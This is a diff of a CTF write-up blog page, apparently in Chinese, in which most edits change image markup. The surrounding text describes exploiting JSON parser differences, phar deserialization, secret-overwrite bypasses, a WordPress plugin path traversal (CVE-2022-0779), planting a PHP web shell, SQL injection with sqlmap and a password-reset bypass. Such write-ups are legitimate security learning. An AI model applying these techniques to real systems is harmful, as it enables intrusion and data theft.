+            data-src="https://tuchuang.huamang.xyz/img/image-20220802152526801.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802152526801.png, https://tuchuang.huamang.xyz/img/image-20220802152526801.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802152526801.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802152526801.png">
+    </a></p>
 <p>再看go的jsonparser</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -652,14 +687,14 @@
 </code></pre></td></tr></table>
 </div>
 </div><p>这里却是取的前者</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802152622907.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802152622907.png, https://tuchuang.huamang.xyz/img/image-20220802152622907.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802152622907.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802152622907.png"
-        title="image-20220802152622907" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802152622907.png" title="image-20220802152622907" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802152622907.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802152622907.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802152622907.png, https://tuchuang.huamang.xyz/img/image-20220802152622907.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802152622907.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802152622907.png">
+    </a></p>
 <p>所以这里他们解析json的方式会不一样，那么我们传入这样的参数</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -671,24 +706,24 @@
 </div>
 </div><p>这里python收到以后，会取后者，也就是flag的num为1，而go会取前者，也就是flag的num为0</p>
 <p>这个意思就是，python会发货，但是go并不会花钱，达到购买的效果</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802152859262.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802152859262.png, https://tuchuang.huamang.xyz/img/image-20220802152859262.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802152859262.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802152859262.png"
-        title="image-20220802152859262" /></p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802152907019.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802152907019.png, https://tuchuang.huamang.xyz/img/image-20220802152907019.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802152907019.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802152907019.png"
-        title="image-20220802152907019" /></p>
-<h1 id="easyweb">easyweb</h1>
-<p>首先是一个文件读取的漏洞，但是要求读取的文件里面必须有demo或者host</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802152859262.png" title="image-20220802152859262" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802152859262.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802152859262.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802152859262.png, https://tuchuang.huamang.xyz/img/image-20220802152859262.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802152859262.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802152859262.png">
+    </a></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802152907019.png" title="image-20220802152907019" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802152907019.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802152907019.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802152907019.png, https://tuchuang.huamang.xyz/img/image-20220802152907019.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802152907019.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802152907019.png">
+    </a></p>
+<h1 id="easyweb" class="headerLink">
+    <a href="#easyweb" class="header-mark"></a>easyweb</h1><p>首先是一个文件读取的漏洞，但是要求读取的文件里面必须有demo或者host</p>
 <p>那么我们就可以这样做</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1217,23 +1252,23 @@
 </code></pre></td></tr></table>
 </div>
 </div><p>然后触发phar</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802153431100.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802153431100.png, https://tuchuang.huamang.xyz/img/image-20220802153431100.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802153431100.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802153431100.png"
-        title="image-20220802153431100" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802153431100.png" title="image-20220802153431100" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802153431100.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802153431100.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802153431100.png, https://tuchuang.huamang.xyz/img/image-20220802153431100.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802153431100.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802153431100.png">
+    </a></p>
 <p>有内网能打</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802153454700.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802153454700.png, https://tuchuang.huamang.xyz/img/image-20220802153454700.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802153454700.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802153454700.png"
-        title="image-20220802153454700" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802153454700.png" title="image-20220802153454700" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802153454700.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802153454700.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802153454700.png, https://tuchuang.huamang.xyz/img/image-20220802153454700.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802153454700.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802153454700.png">
+    </a></p>
 <p>最后的exp</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1283,16 +1318,16 @@
 </span><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
 </code></pre></td></tr></table>
 </div>
-</div><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802153524847.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802153524847.png, https://tuchuang.huamang.xyz/img/image-20220802153524847.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802153524847.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802153524847.png"
-        title="image-20220802153524847" /></p>
-<h1 id="crash">crash</h1>
-<p>题目说504可以拿到flag，504是Gateway Timeout</p>
+</div><p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802153524847.png" title="image-20220802153524847" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802153524847.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802153524847.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802153524847.png, https://tuchuang.huamang.xyz/img/image-20220802153524847.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802153524847.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802153524847.png">
+    </a></p>
+<h1 id="crash" class="headerLink">
+    <a href="#crash" class="header-mark"></a>crash</h1><p>题目说504可以拿到flag，504是Gateway Timeout</p>
 <p>给了源码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1426,18 +1461,18 @@ system
 .
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="非预期">非预期</h2>
-<p>题目只要求构造504就有flag，那么就不一定得按题目走下去，所以我这里应该是非预期了，我让这个会话sleep一段时间，多发几个包，服务器就会受不了了</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802161853201.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802161853201.png, https://tuchuang.huamang.xyz/img/image-20220802161853201.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802161853201.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802161853201.png"
-        title="image-20220802161853201" /></p>
-<h2 id="预期">预期</h2>
-<p>预期就是走题目的逻辑，他会判断secret是否匹配，但是这里是secret是未知的</p>
+</div><h2 id="非预期" class="headerLink">
+    <a href="#%e9%9d%9e%e9%a2%84%e6%9c%9f" class="header-mark"></a>非预期</h2><p>题目只要求构造504就有flag，那么就不一定得按题目走下去，所以我这里应该是非预期了，我让这个会话sleep一段时间，多发几个包，服务器就会受不了了</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802161853201.png" title="image-20220802161853201" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802161853201.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802161853201.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802161853201.png, https://tuchuang.huamang.xyz/img/image-20220802161853201.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802161853201.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802161853201.png">
+    </a></p>
+<h2 id="预期" class="headerLink">
+    <a href="#%e9%a2%84%e6%9c%9f" class="header-mark"></a>预期</h2><p>预期就是走题目的逻辑，他会判断secret是否匹配，但是这里是secret是未知的</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1483,14 +1518,14 @@ def get_password(username):
 </code></pre></td></tr></table>
 </div>
 </div><p>这题有点像：<strong>高校战疫网络安全分享赛:webtmp</strong>，做法就是覆盖掉secret绕过验证，只不过这里对secret关键词进行了过滤，解决办法是unicode编码</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802211532387.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802211532387.png, https://tuchuang.huamang.xyz/img/image-20220802211532387.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802211532387.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802211532387.png"
-        title="image-20220802211532387" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802211532387.png" title="image-20220802211532387" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802211532387.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802211532387.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802211532387.png, https://tuchuang.huamang.xyz/img/image-20220802211532387.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802211532387.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802211532387.png">
+    </a></p>
 <p>这里看到nu1l的wp，发现可以直接hex绕，也是可以的</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1509,86 +1544,84 @@ db.&#39;&#39;&#39;
 </code></pre></td></tr></table>
 </div>
 </div><p>进去就可以修改负载均衡的配置了</p>
-<h1 id="wp-um">WP-UM</h1>
-<p>一进去就是一个安装</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802211909442.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802211909442.png, https://tuchuang.huamang.xyz/img/image-20220802211909442.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802211909442.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802211909442.png"
-        title="image-20220802211909442" /></p>
+<h1 id="wp-um" class="headerLink">
+    <a href="#wp-um" class="header-mark"></a>WP-UM</h1><p>一进去就是一个安装</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802211909442.png" title="image-20220802211909442" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802211909442.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802211909442.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802211909442.png, https://tuchuang.huamang.xyz/img/image-20220802211909442.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802211909442.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802211909442.png">
+    </a></p>
 <p>账号密码放在根目录下了，这就很刻意的让我们去目录遍历去找账号密码了</p>
 <p>他提到了危险出插件，题目给了源码，我们直接进去看看装了什么插件</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802212048525.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212048525.png, https://tuchuang.huamang.xyz/img/image-20220802212048525.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212048525.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802212048525.png"
-        title="image-20220802212048525" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802212048525.png" title="image-20220802212048525" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802212048525.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802212048525.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212048525.png, https://tuchuang.huamang.xyz/img/image-20220802212048525.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212048525.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802212048525.png">
+    </a></p>
 <p>这个user-meta搜了一下，确实存在一个目录遍历的漏洞，看一下版本正好对上，是CVE-2022-0779</p>
-<p><a href="https://skynettools.com/wordpress-user-meta-lite-and-pro-2-4-3-vulnerable-to-path-traversal-exploit/" target="_blank" rel="noopener noreffer">https://skynettools.com/wordpress-user-meta-lite-and-pro-2-4-3-vulnerable-to-path-traversal-exploit/</a>
-</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802212130667.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212130667.png, https://tuchuang.huamang.xyz/img/image-20220802212130667.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212130667.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802212130667.png"
-        title="image-20220802212130667" /></p>
+<p><a href="https://skynettools.com/wordpress-user-meta-lite-and-pro-2-4-3-vulnerable-to-path-traversal-exploit/" target="_blank" rel="noopener noreferrer">https://skynettools.com/wordpress-user-meta-lite-and-pro-2-4-3-vulnerable-to-path-traversal-exploit/</a></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802212130667.png" title="image-20220802212130667" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802212130667.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802212130667.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212130667.png, https://tuchuang.huamang.xyz/img/image-20220802212130667.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212130667.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802212130667.png">
+    </a></p>
 <p>成功探测到</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802212159514.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212159514.png, https://tuchuang.huamang.xyz/img/image-20220802212159514.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212159514.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802212159514.png"
-        title="image-20220802212159514" /></p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802212212148.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212212148.png, https://tuchuang.huamang.xyz/img/image-20220802212212148.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212212148.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802212212148.png"
-        title="image-20220802212212148" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802212159514.png" title="image-20220802212159514" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802212159514.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802212159514.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212159514.png, https://tuchuang.huamang.xyz/img/image-20220802212159514.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212159514.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802212159514.png">
+    </a></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802212212148.png" title="image-20220802212212148" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802212212148.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802212212148.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212212148.png, https://tuchuang.huamang.xyz/img/image-20220802212212148.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212212148.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802212212148.png">
+    </a></p>
 <p>这样探测出用户名密码：<code>MaoGePaMao:MaoGeYaoQiFeiLa</code></p>
 <p>进到后台，在外观编辑处可以直接编辑php代码，直接写php木马</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802212321699.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212321699.png, https://tuchuang.huamang.xyz/img/image-20220802212321699.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212321699.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802212321699.png"
-        title="image-20220802212321699" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802212321699.png" title="image-20220802212321699" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802212321699.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802212321699.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212321699.png, https://tuchuang.huamang.xyz/img/image-20220802212321699.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212321699.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802212321699.png">
+    </a></p>
 <p>进蚁剑翻了很久很久翻到了flag。。。</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802212427630.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212427630.png, https://tuchuang.huamang.xyz/img/image-20220802212427630.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212427630.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802212427630.png"
-        title="image-20220802212427630" /></p>
-<h1 id="easylogin">easylogin</h1>
-<p>wordpress这个版本存在sql注入，这里进行报错注入测试</p>
-<p><a href="https://www.freebuf.com/articles/web/321297.html" target="_blank" rel="noopener noreffer">https://www.freebuf.com/articles/web/321297.html</a>
-</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802212427630.png" title="image-20220802212427630" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802212427630.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802212427630.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212427630.png, https://tuchuang.huamang.xyz/img/image-20220802212427630.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212427630.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802212427630.png">
+    </a></p>
+<h1 id="easylogin" class="headerLink">
+    <a href="#easylogin" class="header-mark"></a>easylogin</h1><p>wordpress这个版本存在sql注入，这里进行报错注入测试</p>
+<p><a href="https://www.freebuf.com/articles/web/321297.html" target="_blank" rel="noopener noreferrer">https://www.freebuf.com/articles/web/321297.html</a></p>
 <p>报错注入成功</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802212508676.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212508676.png, https://tuchuang.huamang.xyz/img/image-20220802212508676.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212508676.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802212508676.png"
-        title="image-20220802212508676" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802212508676.png" title="image-20220802212508676" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802212508676.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802212508676.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212508676.png, https://tuchuang.huamang.xyz/img/image-20220802212508676.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212508676.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802212508676.png">
+    </a></p>
 <p>直接sqlmap嗦</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1721,42 +1754,42 @@ Table: mdl_user_private_key
 </code></pre></td></tr></table>
 </div>
 </div><p>这里进行代码审计，首先在跟进这里</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802212635605.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212635605.png, https://tuchuang.huamang.xyz/img/image-20220802212635605.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212635605.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802212635605.png"
-        title="image-20220802212635605" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802212635605.png" title="image-20220802212635605" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802212635605.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802212635605.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802212635605.png, https://tuchuang.huamang.xyz/img/image-20220802212635605.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802212635605.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802212635605.png">
+    </a></p>
 <p>然后进到这里，这里会有个判断，必须保证token绑定了user，而且时间在半小时内</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802213236052.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802213236052.png, https://tuchuang.huamang.xyz/img/image-20220802213236052.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802213236052.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802213236052.png"
-        title="image-20220802213236052" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802213236052.png" title="image-20220802213236052" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802213236052.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802213236052.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802213236052.png, https://tuchuang.huamang.xyz/img/image-20220802213236052.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802213236052.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802213236052.png">
+    </a></p>
 <p>在本地环境测试下，我通过发送重置密码邮件，就可以更新mdl_user_password_resets里面的token和时间</p>
 <p>这里我直接盲测了一下，直接发只有token参数的数据，因为缺少参数，这里发现跳转到了修改密码的界面</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802213250760.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802213250760.png, https://tuchuang.huamang.xyz/img/image-20220802213250760.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802213250760.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802213250760.png"
-        title="image-20220802213250760" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802213250760.png" title="image-20220802213250760" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802213250760.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802213250760.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802213250760.png, https://tuchuang.huamang.xyz/img/image-20220802213250760.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802213250760.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802213250760.png">
+    </a></p>
 <p>手动修改密码后登录，本地环境成功登录admin</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802213303997.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802213303997.png, https://tuchuang.huamang.xyz/img/image-20220802213303997.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802213303997.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802213303997.png"
-        title="image-20220802213303997" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802213303997.png" title="image-20220802213303997" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802213303997.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802213303997.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802213303997.png, https://tuchuang.huamang.xyz/img/image-20220802213303997.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802213303997.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802213303997.png">
+    </a></p>
 <p>然后在history里面找到完整的payload，不过这个sesskey是有时限的，所以还是手改就好</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1767,36 +1800,35 @@ Table: mdl_user_private_key
 </code></pre></td></tr></table>
 </div>
 </div><p>然后到远程来打，首先sql注入拿到管理员的邮箱，这里找到的是admin@localhost.com</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802213416029.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802213416029.png, https://tuchuang.huamang.xyz/img/image-20220802213416029.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802213416029.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802213416029.png"
-        title="image-20220802213416029" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802213416029.png" title="image-20220802213416029" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802213416029.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802213416029.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802213416029.png, https://tuchuang.huamang.xyz/img/image-20220802213416029.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802213416029.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802213416029.png">
+    </a></p>
 <p>然后发包修改免密进入到后台</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802213430881.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802213430881.png, https://tuchuang.huamang.xyz/img/image-20220802213430881.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802213430881.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802213430881.png"
-        title="image-20220802213430881" /></p>
